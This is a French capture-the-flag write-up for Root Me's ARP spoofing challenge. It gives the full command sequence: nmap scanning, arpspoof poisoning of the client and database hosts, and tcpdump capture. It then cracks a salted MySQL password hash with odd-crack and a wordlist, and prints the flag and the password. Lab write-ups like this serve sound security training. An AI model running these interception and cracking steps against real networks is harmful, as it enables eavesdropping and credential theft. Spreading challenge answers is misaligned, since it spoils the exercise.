# Network - Root Me

## ARP Spoofing - Active listening

Sujet :
```
Votre ami vous assure que vous ne pouvez pas récupérer les informations confidentielles qui transitent sur son réseau. Il est tellement sûr de lui qu’il vous donne un accès à son LAN via une machine que vous contrôlez.

Le flag est la concaténation de la réponse à une requête sur le réseau, ainsi que le mot de passe de la base de données, de la forme suivante : reponse:db_password.

    Démarrez le CTF-ATD "ARP Spoofing EcouteActive"
    Connectez-vous en SSH sur la machine port 22222 (root:root)
    Il n’y a pas de validation de l’environnement virtuel avec un /passwd
```

Liste de toutes les commandes sur le serveur:
```
apt update

apt upgrade

apt install iproute2

root@fac50de5d760:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

apt install nmap

nmap -Pn 172.18.0.3/16
Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-12 22:13 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000026s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:0E:47:5C:7C (Unknown)

Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000035s latency).
All 1000 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.2) are closed
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000035s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)

arp -a
client.arp-spoofing-dist-2_default (172.18.0.2) at 02:42:ac:12:00:02 [ether] on eth0
? (172.18.0.1) at 02:42:0e:47:5c:7c [ether] on eth0
db.arp-spoofing-dist-2_default (172.18.0.4) at 02:42:ac:12:00:04 [ether] on eth0

apt install dsniff

apt install tcpdump

arpspoof -i eth0 -t 172.18.0.2 -r 172.18.0.4
arpspoof -i eth0 -t 172.18.0.4 -r 172.18.0.2

tcpdump -i eth0 -w capture_rootme.pcap
```

Récupérer la capture réseau :
```
scp -P 22222  root@ctf15.root-me.org:/root/capture_rootme.pcap .
```

Dans la capture réseau :
```
Salt : Hex 373658130a0e522531223c2b4e663b4c12721f0f
Frame 7

Hash : 8b688889fcd8259818adf02f87bc028b8927b742
Frame 11

Flag : l1tter4lly_4_c4ptur3_th3_fl4g
Frame 35
```
Pour craquer le hash :
```
pip3 install oddhash

odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:373658130a0e522531223c2b4e663b4c12721f0f /home/axel/Downloads/rockyou.txt 8b688889fcd8259818adf02f87bc028b8927b742
[*] loading file...
[*] found heyheyhey=8b688889fcd8259818adf02f87bc028b8927b742
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords
```

FLAG : l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey


Pour résumer il faut empoisonner la table ARP de la DB et du client, puis capturer les trames qui passent sur le réseau.
Ensuite il faut récupérer le hash du mot de passe de la base de donnée et le casser.